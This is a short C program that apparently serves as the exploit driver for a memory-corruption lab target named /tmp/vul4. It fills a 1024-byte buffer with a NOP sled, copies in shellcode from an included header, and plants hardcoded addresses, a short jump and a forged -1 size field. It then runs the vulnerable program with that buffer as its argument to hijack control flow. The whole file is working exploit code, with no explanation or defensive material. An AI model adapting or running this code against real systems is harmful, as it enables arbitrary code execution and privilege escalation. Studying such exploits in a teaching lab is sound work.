#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/vul4"

int main(void)
{
  char pl[1024];
  memset(pl, 0x90, 1024);
  memcpy(pl + 504, "\x68\xa0\x04\x08\x64\xfa\xff\xbf", 8);
  memcpy(pl + 40, shellcode, strlen(shellcode));
  *(int*)(pl + 4) = -1;
  pl[2] = 0xeb;
  pl[3] = 0xc;
  pl[1023] = '\0';

  char *args[] = { TARGET, pl, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
